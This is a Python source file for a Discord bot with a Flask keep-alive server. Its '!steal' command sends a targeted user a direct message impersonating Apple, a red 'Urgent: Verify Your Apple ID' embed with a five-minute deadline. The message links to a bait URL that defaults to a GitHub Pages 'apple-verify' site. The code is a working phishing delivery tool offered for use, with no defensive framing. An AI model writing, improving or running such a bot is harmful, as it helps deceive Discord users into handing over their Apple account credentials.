import os
import sys
import asyncio
import traceback
import discord
from discord.ext import commands
from flask import Flask
from threading import Thread
import requests

# --------------- FLASK KEEP‑ALIVE ---------------
app = Flask('')
@app.route('/')
def home():
    return "Bot alive — snare is set."

@app.route('/status')
def status():
    try:
        return f"Bot online as {client.user}"
    except:
        return "Bot not ready yet."

def run_web():
    app.run(host='0.0.0.0', port=8000)

Thread(target=run_web, daemon=True).start()

# --------------- TOKEN FROM ENVIRONMENT ---------------
TOKEN = os.environ.get('TOKEN', '').strip()
if not TOKEN:
    print("❌ ERROR: Environment variable TOKEN not set.", file=sys.stderr)
    print("   Run: export TOKEN='your-bot-token-here'", file=sys.stderr)
    sys.exit(1)

# --------------- TOKEN VALIDATION ---------------
def validate_token(tok):
    headers = {'Authorization': f'Bot {tok}'}
    try:
        resp = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return True, f"Valid. Bot username: {data['username']}#{data['discriminator']}"
        else:
            return False, f"Discord rejected (HTTP {resp.status_code}): {resp.text}"
    except Exception as e:
        return False, f"Network error: {e}"

print("🔍 Testing token...", flush=True)
valid, msg = validate_token(TOKEN)
if not valid:
    print(f"❌ Token check failed: {msg}", file=sys.stderr)
    sys.exit(1)
print(f"✅ Token check passed: {msg}", flush=True)

# --------------- BAIT LINK FROM ENVIRONMENT ---------------
BAIT_URL = os.environ.get('BAIT_URL', '').strip()
if not BAIT_URL:
    BAIT_URL = "https://k33Mr3b0RN.github.io/apple-verify/"  # <-- Set this if you want, or use env var
    print("⚠️  No BAIT_URL set; using hardcoded default. Check it!", flush=True)

# --------------- BOT SETUP ---------------
class MyClient(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)

    async def on_ready(self):
        print(f"🎯 Bot online as {self.user}", flush=True)

    async def on_message(self, message):
        if message.author == self.user:
            return
        if message.content.startswith('!steal'):
            target = message.mentions[0] if message.mentions else message.author
            embed = discord.Embed(
                title="⚠️ Urgent: Verify Your Apple ID",
                description="Tap the link below to secure your account. Expires in 5 min.",
                color=0xff0000
            )
            embed.add_field(name="Verification", value=f"[Tap Here]({BAIT_URL})")
            try:
                await target.send(embed=embed)
                await message.channel.send(f"✅ Sent to {target.name}")
            except discord.Forbidden:
                await message.channel.send("❌ Cannot DM that user.")
        await self.process_commands(message)

client = MyClient()

# --------------- LAUNCH ---------------
try:
    print("🚀 Launching bot...", flush=True)
    client.run(TOKEN)
except discord.LoginFailure as e:
    print(f"❌ Login failed: {e}", file=sys.stderr)
except Exception as e:
    print(f"💥 Crash:\n{traceback.format_exc()}", file=sys.stderr)
